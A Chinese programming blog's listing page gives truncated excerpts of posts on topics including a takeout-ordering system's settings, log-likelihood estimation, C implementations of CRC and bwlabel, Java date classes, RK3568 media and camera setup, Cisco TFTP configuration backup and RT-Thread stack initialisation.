订单查询 功能说明：可通过此菜单查询近期的订单，也可以通过条件去查询导出相对应的订单；筛选条件有订单类型、下单日期、订单状态、订单信息等条件
订单类型：可按照全部订单、自提订单、预订单
下单日期：可按照近两日或按照时间筛选
订单状态：可按照全部订单、进行中、已完成、已取消、退单等条件查询
订单信息：可按照订单号、手机号、订单姓名、用户昵称等条件查询
外卖设置 功能说明：设置外卖相关的参数，如设置外卖的营业时间、下单公告、配送支持、自提地址、打印设置、预约单等设置
营业时间：可设置24小时营业，也可以自定义设置营业时间，（注意：营业时间最多可设置三组，如果需要设置跨天时间，请将第一个时间要小于第二个时间，如21：30-次日01-30）
配送支持：可设置订单是否开启外卖配送或到店自取等开关（注意：外卖配送或到店自取，两者必须开通一个）
预订单设置：设置用户是否可以提前预订下单，可设置相对应的提前预订天数、预订时间间隔等操作
配送设置 功能说明：设置当前门店配送的区域划分、配送费用、配送范围、起送价以及自取位置等设置
配送费可按固定金额、按距离或按区域收取
配送方式
本系统提供多家第三方配送方式，可根据自己的业务需求按需配置
商品 外卖商品 功能说明：此分类下的商品仅供在外卖场景下显示，可一键管理外卖商品添加、价格、库存、会员价等设置
注意事项：
1、在添加外卖商品前，请先完善商家信息、外卖分类、商品单位等操作，否则无法正常添加商品
2、商品分类在没有商品的情况下，前端不显示此分类、
添加商品 商品扩展 功能说明：主要完善商品信息默认值等操作，如规格库、属性库、加料库、单位库、商品标签、打印标签等操作
规格：如大杯、小杯、型号等规格，可按照不同的规格值设置不同的价格
属性：如灰色、黑色等属性
加料：如多加糖、加粉丝等，可按照不同的加料值设置不同的价格，
单位：如个、杯等
商品标签：如将不同的商品归纳到不同的商品标签中
打印标签：可按照商品设置不同的打印标签，让打印机可根据商品标签打印
快速导入 商品导入流程
1：下载模板 —— 填好模板商品属性
（商品属性可参考下方信息模板）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7fb51fd8339f9d54c18cdb4074642e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44c374085b20000aae29eb35357212a9/" rel="bookmark">
			统计学补充概念02-对数似然
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 对数似然（Log-Likelihood）是统计学中一种常用的方法，用于估计模型参数。在概率统计中，似然函数表示给定观测数据，关于模型参数的概率分布。对数似然则是似然函数取对数后的结果。
假设有一组观测数据 x1, x2, …, xn，它们来自一个概率分布，且这个概率分布有一些未知的参数 θ 需要估计。似然函数 L(θ) 表示在给定参数 θ 下观测数据出现的概率。对数似然函数 LL(θ) 则是似然函数的对数形式：
LL(θ) = log(L(θ))
作用 通过最大化对数似然函数，可以找到在给定观测数据下最有可能的模型参数值。
常见的使用场景包括：
参数估计： 通过最大化对数似然函数，可以找到使观测数据在模型中出现概率最大的参数值，从而对模型参数进行估计。
模型选择： 对比不同模型的对数似然函数，可以评估哪个模型更好地拟合观测数据。较高的对数似然值通常表示模型与数据拟合较好。
假设检验： 在假设检验中，可以通过比较不同参数值下的对数似然函数来判断哪个假设更合理。
正则化： 在正则化方法中，对数似然函数可以结合一个惩罚项，从而实现对模型参数的约束，防止过拟合。
通常，对数似然函数的具体形式取决于所使用的概率分布以及问题的特定背景。在实际应用中，通过数值优化方法（如梯度下降）来最大化对数似然函数，从而找到最优的参数值。
需要注意的是，对数似然函数通常用于连续型数据，对于离散型数据，可能会使用类似的对数似然概念来进行模型参数估计和推断。
代码实现 import numpy as np import scipy.stats # 生成一组模拟观测数据 np.random.seed(42) data = np.random.normal(5, 2, 100) # 定义对数似然函数 def log_likelihood(params, data): mu, sigma = params return np.sum(np.log(scipy.stats.norm.pdf(data, mu, sigma))) # 初始参数值 initial_params = [0, 1] # 最大化对数似然函数 from scipy.optimize import minimize result = minimize(lambda params: -log_likelihood(params, data), initial_params) # 输出估计的参数值 estimated_mu, estimated_sigma = result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44c374085b20000aae29eb35357212a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d8a003e51c3272bb0ea74d7a4345363/" rel="bookmark">
			利用var()实现主题切换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		const themeColor = { "text-color": { "light": '#fff', "dark": '#000' }, "text-bgc": { "light": 'white', "dark": 'black' } }; function setTheme(theme) { const root = document.documentElement; for (const key in theme) { root.style.setProperty(`--${key}`, theme[key]); } } // 初始设置为 light 主题 setTheme(themeColor["text-color"]["light"]); // 切换主题 function toggleTheme() { const currentTheme = getComputedStyle(document.documentElement).getPropertyValue('--text-color'); const newTheme = currentTheme === themeColor["text-color"]["light"] ? themeColor["text-color"]["dark"] : themeColor["text-color"]["light"]; setTheme(newTheme); } &lt;template&gt; &lt;div&gt; &lt;h1 :style="{ color: themeColor['text-color'][currentTheme] }"&gt;Hello, World!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d8a003e51c3272bb0ea74d7a4345363/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f17e3479c8f2aa09e2f1d1affec268c/" rel="bookmark">
			Mac怎么使用n来管理node版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装n 1、清除node缓存:
sudo npm cache clean -f 2、安装 n 执行: npm install n -g 注意：如果报错如：code EACCES errno -13，表示你没有权限安装，使用管理员身份安装：
sudo npm i n -g 3、查看n是否安装成功执行：
n --version 4、安装n成功之后，如果你想要安装指定版本的 Node.js，可以使用以下命令：
n &lt;version&gt;
例如，要安装 Node.js 的 12.16.1 版本，可以运行以下命令：
n 12.16.1 使用以下命令来切换到所需的 Node.js 版本：
n use &lt;version&gt;
例如，要切换到 Node.js 的 12.16.1 版本，可以运行以下命令：
n use 12.16.1 现在，您已经成功地使用 n 工具来管理 Node.js 版本了。
卸载 n 执行 npm uninstall n -g 或 sudo npm uninstall n -g
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f17e3479c8f2aa09e2f1d1affec268c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b60ab6a66c5370d4c4b2031287e1e796/" rel="bookmark">
			bwlabel函数的C语言实现及用法解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		bwlabel函数的C语言实现及用法解析
在图像处理的领域中，连通区域标记是一项非常重要的技术。在C语言中，我们可以使用bwlabel函数来实现这个功能。本文将介绍bwlabel函数的实现原理和用法，并通过示例代码来演示其功能。
bwlabel函数的C语言实现及用法解析
bwlabel函数的实现原理是通过扫描二值图像，并为每个连通区域分配一个唯一的标签。其中，连通区域是指由相邻的像素组成的一片区域，相邻的像素可以是相邻的8个像素或4个像素。以下是bwlabel函数的C语言实现：
void bwlabel(unsigned char *image, int *labelImage, int width, int height) {
int label = 1;
int labels[width * height];
memset(labels, 0, width * height * sizeof(int));
for (int i = 0; i &lt; height; i++) {
for (int j = 0; j &lt; width; j++) {
int index = i * width + j;
if (image[index] == 255) {
if (j &gt; 0 &amp;&amp; labels[index - 1] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b60ab6a66c5370d4c4b2031287e1e796/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a721ac92a3dd16cda886d502a4133ddf/" rel="bookmark">
			Chameleon算法的C语言实现及代码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Chameleon算法的C语言实现及代码解析
在计算机科学领域中，算法的设计和实现是非常重要的。而在大量的算法中，Chameleon算法以其独特的特点和应用广泛受到了研究者们的关注。本文将围绕Chameleon算法的C语言实现及其代码解析展开，通过具体的示例来解释其原理和应用。
Chameleon算法的C语言实现及代码解析
Chameleon算法是一种基于模拟生物觅食原理的算法，其主要目的是通过模拟觅食过程来解决优化问题。在Chameleon算法中，主要包含了两个重要的部分：觅食过程和自适应调整。
首先，我们来看觅食过程的实现。在C语言中，我们可以通过使用循环来模拟觅食的过程，并根据问题的特点设计相应的搜索策略。在这个过程中，我们需要定义合适的目标函数以评估每个解的优劣，并根据当前解的质量来调整搜索的方向和策略。通过不断迭代和优化，算法能够逐渐接近最优解。
其次，我们来看自适应调整的实现。在Chameleon算法中，自适应调整是非常重要的，它能够根据搜索过程中的反馈信息来调整算法的参数和策略，以进一步提高搜索效率。在C语言中，我们可以通过定义合适的数据结构和使用条件语句来实现自适应调整的功能。通过根据问题的特点，选择合适的自适应调整策略，算法能够更好地适应不同的问题并取得更好的效果。
下面是Chameleon算法的C语言实现的示例代码：
#include
// 定义目标函数
double objective_function(double x) {
return x * x;
}
// Chameleon算法的实现
double chameleon_algorithm() {
double current_solution = 0.0;
double step_size = 0.1;
double best_solution = current_solution;
double best_fitness = objective_function(current_solution);
for (int i = 0; i &lt; 100; i++) {
double random_step = step_size * (rand() - RAND_MAX / 2) / (RAND_MAX / 2.0);
double new_solution = current_solution + random_step;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a721ac92a3dd16cda886d502a4133ddf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/078840ac9e90c79e4e223daa426ecc33/" rel="bookmark">
			CRC编码计算方法及C语言实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CRC编码计算方法及C语言实现
CRC（Cyclic Redundancy Check）是一种常用的错误校验码，用于检测和纠正传输过程中的错误。在数据通信和存储中，CRC编码被广泛应用，因为它能够高效地检测错误，并且实现简便。
CRC编码计算方法及C语言实现
CRC编码的计算方法基于多项式的除法运算，其中多项式被称为生成多项式。生成多项式的系数决定了CRC编码的性能和容错能力。在CRC编码中，数据和生成多项式进行除法运算，得到的余数作为校验码附加到数据中进行传输。接收方将数据和附加的校验码进行除法运算，如果余数为0，则表明数据在传输过程中没有发生错误。
下面将介绍一种常用的CRC编码计算方法及其C语言实现。假设生成多项式为G(x)，数据为D(x)，校验码为R(x)，则CRC编码的计算过程可以分解为以下几个步骤：
初始化：将R(x)的系数全部置为0，使得R(x)的初始值为全0。
对数据进行处理：将数据D(x)的系数个数扩展至G(x)的系数个数加上R(x)的最高次幂的次数。可以使用左移运算符&lt;&lt;实现。&lt;&gt;
进行除法运算：通过模2除法运算，将数据D(x)与生成多项式G(x)进行除法运算，得到的余数保存在R(x)中。具体的除法运算可以通过循环遍历D(x)和G(x)的系数来实现。
循环操作：重复进行第3步的除法运算，直到遍历完所有的数据位。
结果处理：将R(x)的系数作为校验码附加到数据D(x)的后面，得到CRC编码后的数据。
下面是一个用C语言实现CRC编码计算的示例代码：
#include
// 生成多项式
#define GENERATOR_POLY 0x04C11DB7
// 计算CRC编码
unsigned int calculate_crc(unsigned char data[], int length) {
unsigned int crc = 0xFFFFFFFF;
for (int i = 0; i &lt; length; i++) {
crc ^= (data[i] &lt;&lt; 24=“”&gt;
for (int j = 0; j &lt; 8; j++) {
if (crc &amp; 0x80000000) {
crc = (crc &lt;&lt; 1=“”&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/078840ac9e90c79e4e223daa426ecc33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53472019155e3c27e2813eaf1c01d324/" rel="bookmark">
			java---日期类汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java中常用的日期类有Date,SimpleDateFormat,Calendar这三种，现在分别对三个类的日常使用进行大概的总结：
1.Date类 1.1 基本介绍 一般常用的事Java.util.Date包下的Date类，在java.sql.Date包下也有一个Date类，sql包下的Date类主要用于和数据库打交道，其内容只包括日期，没有时间，util包下的Date类用于平常日期使用，其内容包括日期和时间。Date类表示系统特定的时间戳，可以精确到毫秒。Date类中的大部分方法都过时了，或者被Calendar类中的方法所取代。
1.2 构造方法 Date类有两个构造方法，Date对象表示时间的默认顺序是 星期，月，日，小时，分，秒，年
无参构造方法Date():此种形式表示分配一个Date对象，并初始化，以便他代表被分配的时间，精确到毫秒，使用该构造方法创建的对象可以获取本地的当前时间。 带参数的构造方法Date(long date)：此种形式表示分配一个Date对象，并将其初始化为表示从标准基准时间起指定的毫秒数（也就是从GMT（格林尼治时间）时间1970年1月1日0时0分0秒开始经过参数date指定的毫秒数 源码：
private transient long fastTime; public Date() { this(System.currentTimeMillis()); } public Date(long date) { fastTime = date; } import java.util.Date; Date date = new Date(); System.out.println(date); //输出结果： Fri Aug 11 14:32:19 CST 2023 long date=3*24*60*60*1000;//1秒=1000毫秒，该时间为一天24小时 Date d2=new Date(date); System.out.println(d2);//输出从GMT基准时间过了3天后的时间 //输出：Sun Jan 04 08:00:00 CST 1970（中央标准时间） 1.3常用方法 boolean after(Date date)：判断调用此方法的Date对象是否在指定日期之后boolean before(Date date)：判断调用此方法的Date对象是否在指定日期之前int compareTo(Date date)：比较调用此方法的Date对象与指定的日期，两者相等时返回0，调用对象在指定对象日期之前返回负数，反之返回正数boolean equals(Object date)：当调用此方法的Date对象与指定日期相等时，返回true,否则返回falselong getTime()：返回自1970年1月1日0时0分0秒以来，此Date对象表示的毫秒数String toString()：获取当前日期和时间并用一下形式的输出：“ dow mon dd hh：mm：ss zzz yyy”，dow:一周中的某一天（Sun,Mon,Tue,Wed,Thu,Fri,Sat） //public Date():分配一个Date对象，并初始化，以便他代表他被分配的时间，精确到毫秒 Date d1=new Date(); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53472019155e3c27e2813eaf1c01d324/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc76b5d9e028efde452d58ee053ec3a2/" rel="bookmark">
			时序预测-Informer简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Informer介绍1. Transformer存在的问题2. Informer研究背景3. Informer 整体架构3.1 ProbSparse Self-attention3.2 Self-attention Distilling3.3 Generative Style Decoder 4. Informer的实验性能5. 相关资料 Informer介绍 1. Transformer存在的问题 Informer实质是在Transformer的基础上进行改进，通过修改transformer的结构，提高transformer的速度。那么Transformer有什么样的缺点：
（1）self-attention的平方复杂度。self-attention的时间和空间复杂度是O(L^2)，L为序列长度。
（2）对长输入进行堆叠(stack)时的内存瓶颈。多个encoder-decoder堆叠起来就会形成复杂的空间复杂度，这会限制模型接受较长的序列输入。
（3）预测长输出时速度骤降。对于Tansformer的输出，使用的是step-by-step推理得像RNN模型一样慢，并且动态解码还存在错误传递的问题。
2. Informer研究背景 论文的研究背景为：长序列预测问题。这些问题会出现在哪些地方呢：
​ ● 股票预测（数据、规则都在变，模型都是无法预测的）
​ ● 机器人动作的预测
​ ● 人体行为识别（视频前后帧的关系）
​ ● 气温的预测、疫情下的确诊人数
​ ● 流水线每一时刻的材料消耗，预测下一时刻原材料需要多少…
那么以上需要时间线来进行实现的，无疑会想到使用Transformer来解决这些问题，Transformer的最大特点就是利用了attention进行时序信息传递。每次进行一次信息传递，我们需要执行两次矩阵乘积，也就是QKV的计算。并且我们需要思考一下，我们每次所执行的attention计算所保留下来的值是否是真的有效的吗？我们有没有必要去计算这么多attention？
那么对于现在的时间预测可以大致分为下面三种：
​ ● 短序列预测
​ ● 趋势预测
​ ● 精准长序列预测
很多算法都是基于短序列进行预测的，先得知前一部分的数据，之后去预测短时间的情况。想要预测一个长序列，就不可以使用短预测，预测未来半年or一年，很难预测很准。长序列其实像是滑动窗口，不断地往后滑动，一步一步走，但是越滑越后的时候，他一直在使用预测好的值进行预测，长时间的序列预测是有难度的。
那么有哪些时间序列的经典算法：
​ ● Prophnet：很实用的工具包，很适合预测趋势，但算的不精准。
​ ● Arima：短序列预测还算精准，但是趋势预测不准。多标签。
以上两种一旦涉及到了长序列，都不可以使用。
​ ● Informer中将主要致力于长序列问题的解决
可能在这里大家也会想到LSTM：但是这个模型在长序列预测中，如果序列越长，那速度肯定越慢，效果也越差。这个模型使用的为串行结构，效率很低，也会基于前面的特征来预测下一个特征，其损失函数的值也会越来越大。
LSTM预测能力限制了LSTF的性能。例如，从长度=48开始，MSE上升得高得令人无法接受，推理速度迅速下降。
那么我们Transformer中也有提及到改进LSTM的方法，其优势和问题在于：
（1）万能模型，可直接套用，代码实现简单。
（2）并行的，比LSTM快，全局信息丰富，注意力机制效果好。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc76b5d9e028efde452d58ee053ec3a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f833dfe4f910a1bc6bc0b1a1433634b/" rel="bookmark">
			Linux系统服务器性能参数指标怎么看？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要查看Linux系统服务器的性能参数指标，可以使用以下命令和工具：
top命令：top命令是一个常用的性能监控工具，可以实时查看系统的运行状态、CPU使用情况、内存占用、进程信息等。在终端中输入top命令即可显示实时的性能指标。 vmstat命令：vmstat命令用于报告虚拟内存的统计信息，可以显示CPU使用情况、内存使用情况、交换空间、IO等信息。可以使用以下命令查看vmstat的输出：
vmstat sar命令：sar命令用于收集、报告和分析系统的性能指标，可以查看CPU利用率、内存使用情况、磁盘IO、网络流量等信息。使用sar命令需要先安装sysstat工具包，并使用以下命令运行sar：
sar -u # 查看CPU使用情况 sar -r # 查看内存使用情况 sar -b # 查看磁盘IO情况 sar -n DEV # 查看网络流量 iostat命令：iostat命令用于报告系统的磁盘和IO统计信息，可以查看磁盘读写速度、IO等待时间等信息。使用以下命令查看iostat的输出：
iostat free命令：free命令用于查看系统的内存使用情况，可以显示可用内存、已用内存、缓存、交换空间等信息。使用以下命令查看free的输出：
free 通过使用这些命令和工具，你可以获取Linux系统服务器的各种性能参数指标。根据实际需求，你可以结合这些工具和其他监控工具，进行定期的性能监控和分析，以便及时发现和解决潜在的性能问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63e8b9598100eb37d9382a978ab79254/" rel="bookmark">
			RK3568 MPP编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述 瑞芯微提供的媒体处理软件平台（Media Process Platform，简称 MPP）是适用于瑞芯微芯片系列的
通用媒体处理软件平台。该平台对应用软件屏蔽了芯片相关的复杂底层处理，其目的是为了屏蔽不
同芯片的差异，为使用者提供统一的视频媒体处理接口（Media Process Interface，缩写 MPI）。MPP
提供的功能包括：
视频解码：
H.265 / H.264 / H.263 / VP9 / VP8 / MPEG-4 / MPEG-2 / MPEG-1 / VC1 / MJPEG
视频编码：
H.264 / VP8 / MJPEG
视频处理：
视频拷贝，缩放，色彩空间转换，场视频解交织（Deinterlace）
2.MPP源码下载 git clone https://github.com/rockchip-linux/mpp.git 3.编码demo测试 mpi_enc_test -w 720 -h 480 -t 7 -i /sdcard/soccer_720x480_30fps.yuv -o /sdcard/out.h264 -n 1000 mpi_enc_test 的命令参数中，图像宽度（w）图像高度（h），码流类型（t）为强制要求参数，其他参
数如输入文件（i），输出文件（o），编码帧数（n）等为可选参数。
执行完测试程序在/sdcard目录下会生成out.h264文件。
将out.h264在VLC media player播放器播放：
4.MPI接口使用流程 创建 MPP context 和 MPP api 接口
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63e8b9598100eb37d9382a978ab79254/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3664c03bf582efeb5c04dce8799a3149/" rel="bookmark">
			RK3568 Camera点亮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.camera名词解释 在现代移动设备中，常用一种接口用来连接SOC和LCD和Camera,这种接口就是MIPI
其中SOC和LCD连接叫 DSI（DisplayCommandSet）,SOC和Camera连接叫CSI（DisplaySerialInterface）。
二.camera数据通路 一般情况下，Camera和SOC有两个接口进行连接，分为为MIPI接口和I2C接口，其中MIPI接口用来传输图像的数据，数据传输路径为从Sensor传输到SOC。另一个接口为I2C接口，主要是用来SOC对Sensor初始化配置寄存器和摄像头参数的配置，比如要进行图像数据捕获的时候就需要通过i2c对Sensor的寄存器进行配置。
由上面的两个图可以看到，光线经过Sensor之后，Sensor芯片经过ADC转换生成图像数据，然后Sensor生成的图像数据经过MIPI总线进入SOC，进入SOC之后经过ISP进行图像处理。所以由此可以可以看出，Camera驱动V4L2一定有这3部分组成，第一部分与Sensor相关的，比如控制Sensor的寄存器进行配置，这一部分是有Sensor厂家提供。第二部分和MIPI相关的，需要MIPI进行图像传输，所以驱动应该就有这一部分的驱动，这部分一般是由SOC厂家提供。第三部分就是ISP部分，有些SOC有ISP图像处理模块，经过MIPI传输的图像进入SOC之后需要在传入SOC的ISP模块对图像进一步进行加工，所以一定是有一部分驱动是描述ISP模块的。
三.Camera 使用 用单目摄像头配置为full mode，若使用双目摄像头配置为split mode。
full mode：
仅使用csi2_dphy0,csi2_dphy0与csi2_dphy1/csi2_dphy2互斥,不可同时使用;data lane最大4 lanes;最大速率2.5Gbps/lane; split mode：
仅使用csi2_dphy1和csi2_dphy2, 与csi2_dphy0互斥,不可同时使用;
csi2_dphy1和csi2_dphy2可同时使用;
csi2_dphy1和csi2_dphy2各自的data lane最大是2 lanes;
csi2_dphy1对应物理dphy的lane0/lane1;
csi2_dphy2对应物理dphy的lane2/lane3;
最大速率2.5Gbps/lane
四.点亮sensergc2053/gc2093 添加驱动源文件：
\kernel\drivers\media\i2c\gc2053.c \kernel\drivers\media\i2c\gc2093.c \kernel\include\config\video\gc2053.h \kernel\include\config\video\gc2093.h 修改Makefile：
kernel/drivers/media/i2c/Makefile +obj-$(CONFIG_VIDEO_GC2053)	+= gc2053.o +obj-$(CONFIG_VIDEO_GC2093)	+= gc2093.o 修改Kconfig：
config VIDEO_GC2053 tristate "GalaxyCore GC2053 sensor support" depends on I2C &amp;&amp; VIDEO_V4L2 &amp;&amp; VIDEO_V4L2_SUBDEV_API depends on MEDIA_CAMERA_SUPPORT select V4L2_FWNODE help Support for the GalaxyCore GC2053 sensor. To compile this driver as a module, choose M here: the module will be called gc2053.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3664c03bf582efeb5c04dce8799a3149/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10f452f0bfd81ac1d8fe3fa8f619cb2a/" rel="bookmark">
			思科交换机和路由器使用TFTP备份和还原配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（1）给交换机配置管理地址，保证交换机与服务器相连通
SW1(config)#int vlan 1
SW1(config-if)#ip add 192.168.1.1 255.255.255.0
SW1(config-if)#no shut
SW1#write
（2）备份startup-config到服务器
SW1#copy startup-config tftp:
Address or name of remote host []? 192.168.1.2
Destination filename [SW1-confg]?
Writing startup-config…!!
[OK - 1090 bytes]
1090 bytes copied in 0 secs
（2）从服务器还原startup-config
SW1#conf t
SW1(config)#host sw123 //改名字，为了看清还原结果
sw123#copy tftp: running-config
Address or name of remote host []? 192.168.1.2
Source filename []? SW1-confg
Destination filename [running-config]?
Accessing tftp://192.168.1.2/SW1-confg…
Loading SW1-confg from 192.168.1.2: !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10f452f0bfd81ac1d8fe3fa8f619cb2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e82b15438931aa327f9143aeb6b2e84/" rel="bookmark">
			安卓客户端实现将联系人保存到通讯录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、声明访问和修改通讯录权限
2、为h5提供将联系人保存到通讯录的方法
这里是在安卓客户端中为h5页面提供了一个将联系人保存到通讯录的方法。
1、声明访问和修改通讯录权限 在AndroidManifest.xml文件中声明如下权限：
&lt;!-- 访问和修改手机通讯录权限 --&gt; &lt;uses-permission android:name="android.permission.WRITE_CONTACTS" /&gt; 2、为h5提供将联系人保存到通讯录的方法 // @JavascriptInterface这个注解表示可以从一个网页中的javaScript代码调用安卓的原生方法 @JavascriptInterface public void saveContact(String json){ // 将网页传过来的联系人手机号和姓名进行解析 JSONObject jsonObject = JSON.parseObject(json); teacherMobilePhone = jsonObject.getString("mobilePhone"); teacherName = jsonObject.getString("name"); // 将联系人保存到通迅录之前先检查是否有修改通讯录的权限，如果有权限则直接保存通讯录；没有权限需要先申请修改通讯录的权限 if(requestPermissions(PERMISSIONS_REQUEST_WRITE_CONTACTS, Manifest.permission.WRITE_CONTACTS)){ // 如果已经开启了权限，则直接将联系人保存到通讯录 saveMobilePhoneAndName(teacherMobilePhone,teacherName); } } /** * 检查并申请权限 * @return 是否所需权限已经申请 */ public boolean requestPermissions(int req, String... permissions){ if (getActivity() == null || permissions == null){ return true; } fastClickUtil.start(REQUEST_PERMISSIONS_TAG); if (Build.VERSION.SDK_INT &gt;= Build.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e82b15438931aa327f9143aeb6b2e84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/915fc3659ef79800ad142406d3691b7e/" rel="bookmark">
			c语言——阶乘学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 正在学习如何记录生活与学习啦！以下是c语言关于阶乘的学习笔记。
一、阶乘是什么？ 阶乘指从1乘以2乘以3乘以4一直乘到所要求的数。例如所要求的数是4，则阶乘式是1×2×3×4，得到的积是24，24就是4的阶乘。任何大于1的自然数n阶乘表示方法： n!=1×2×3×……×n
二、计算n的阶乘 n!=1×2×3×4…×n 在vs2019中，使用scanf（）函数必须使用：
#define _CRT_SECURE_NO_WARNINGS，不然会报错。
#include&lt;stdio.h&gt; int main() { int a = 1; int n = 0; int sum = 1; scanf("%d",&amp;n); for (a = 1; a &lt;= n; a++) { sum = sum * a; } printf("%d",sum); return 0; } 例如：5的阶乘
5！=1×2×3×4×5
二、计算1！+2！+3！(方法一，利用2个for循环) 1！=1 2！=1×2 3！=1×2×3 最后把他们在加起来
#include&lt;stdio.h&gt; int main() { int i = 1; int n = 0; int s = 1; int sum = 0; for (n = 1; n &lt;= 3; n++) { s = 1;//注意位置 for(i=1;i&lt;=n;i++) { s = s * i; } sum = sum + s; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/915fc3659ef79800ad142406d3691b7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d4dd8b36cf59b582a8763b9da65bcd1/" rel="bookmark">
			rt_hw_stack_init 线程栈初始化参数分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rt_hw_stack_init rt-thread线程栈初始化参数分析 文章目录 `rt_hw_stack_init` rt-thread线程栈初始化参数分析Q:A:1. `rt_hw_stack_init`调用分析2. `rt_hw_stack_init` 实现分析2.1 向下增长型栈 rt_hw_stack_init 实现2.1 向上增长型栈 rt_hw_stack_init 实现 扩展知识： 本文代码内采用的rtthread源码采用master分支分析，对应commit：dbf1463176921bed3310fbd9dd400897b64f501b
Github 源码地址链接！！！
Q: RT-Thread 在线程初始化的代码内有一段初始化线程堆栈的代码，如下：
thread-&gt;sp = (void *)rt_hw_stack_init(thread-&gt;entry, thread-&gt;parameter, (rt_uint8_t *)((char *)thread-&gt;stack_addr + thread-&gt;stack_size - sizeof(rt_ubase_t)), (void *)_thread_exit); 在调用 rt_hw_stack_init() 初始化堆栈的时候传入线程栈起始地址进行了 -sizeof(rt-ubase_t) 操作，而在 rt_hw_stack_init() 函数内又进行 stk = stack_addr + sizeof(rt_uint32_t); 将其给加了回去，这操作的意义是什么呢？还是说是历史遗留问题？
在《野火 RT-Thread内核实现与应用开发指南》内也有说到此处的设计，但并未进行升入说明，仅简单的一笔带过，因此大多数读者和我一样都对此充满疑问。
A: 1. rt_hw_stack_init调用分析 分析此问题，首先我们需要结合完整版本的 rt-thread 内核代码进行阅读才能更好的充分理解。
在rt-thread内核代码中，初始化线程堆栈的时候其实是有一个宏声明进行选择的，具体代码如下：
#ifdef ARCH_CPU_STACK_GROWS_UPWARD thread-&gt;sp = (void *)rt_hw_stack_init(thread-&gt;entry, thread-&gt;parameter, (void *)((char *)thread-&gt;stack_addr), (void *)_thread_exit); #else thread-&gt;sp = (void *)rt_hw_stack_init(thread-&gt;entry, thread-&gt;parameter, (rt_uint8_t *)((char *)thread-&gt;stack_addr + thread-&gt;stack_size - sizeof(rt_ubase_t)), (void *)_thread_exit); #endif /* ARCH_CPU_STACK_GROWS_UPWARD */ 也就是针对不同架构的CPU实际传入此函数的参数还存在着不一样的地方！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d4dd8b36cf59b582a8763b9da65bcd1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0faed4f73faa9fcae8a8e124e7899d88/" rel="bookmark">
			cubemx hal stm32 舵机 可减速 任意位置停止 驱动代码
			</a>
		</h2>
		
	</header>
